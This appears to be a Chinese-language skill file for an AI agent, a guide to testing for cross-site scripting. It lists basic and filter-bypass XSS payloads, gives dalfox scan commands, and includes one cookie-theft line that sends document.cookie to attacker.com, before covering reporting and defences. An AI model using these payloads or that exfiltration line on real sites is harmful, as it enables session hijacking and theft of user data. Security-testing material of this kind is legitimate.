---
name: xss-testing
description: XSS跨站脚本攻击测试的专业技能
version: 1.0.0
---

# XSS测试技能

## 概述

跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。

## XSS类型

### 1. 反射型XSS (Reflected XSS)
- 恶意脚本通过URL参数传递
- 服务器直接返回包含脚本的响应
- 需要用户点击恶意链接

### 2. 存储型XSS (Stored XSS)
- 恶意脚本存储在服务器（数据库、文件等）
- 所有访问受影响页面的用户都会执行脚本
- 影响范围更大

### 3. DOM型XSS (DOM-based XSS)
- 客户端JavaScript处理用户输入不当
- 不涉及服务器端处理
- 通过修改DOM结构触发

## 测试方法

### 基础Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 绕过过滤

#### 大小写绕过
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 编码绕过
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### 事件处理器
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### 伪协议
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### 高级绕过技术

#### 使用String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### 使用eval和atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### 使用HTML实体
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## 工具使用

### dalfox
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 指定参数
dalfox url "http://target.com/page" -d "q=test" -X POST

# 使用自定义payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- 使用Intruder模块进行批量测试
- 使用Repeater手动测试
- 使用Scanner自动检测

### 浏览器控制台
- 测试DOM型XSS
- 检查JavaScript执行环境
- 调试payload

## 验证和利用

### 验证步骤
1. 确认payload被执行
2. 检查是否被过滤或编码
3. 测试不同上下文（HTML、JavaScript、属性等）
4. 评估影响（Cookie窃取、会话劫持等）

### 利用场景
- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- 键盘记录：注入键盘事件监听器
- 钓鱼攻击：伪造登录表单
- 会话劫持：获取用户会话token

## 报告要点

- XSS类型（反射/存储/DOM）
- 触发位置和参数
- 完整的POC
- 影响评估
- 修复建议（输出编码、CSP策略等）

## 防护措施

- 输入验证和过滤
- 输出编码（HTML、JavaScript、URL）
- Content Security Policy (CSP)
- HttpOnly Cookie标志
- 使用安全的框架和库
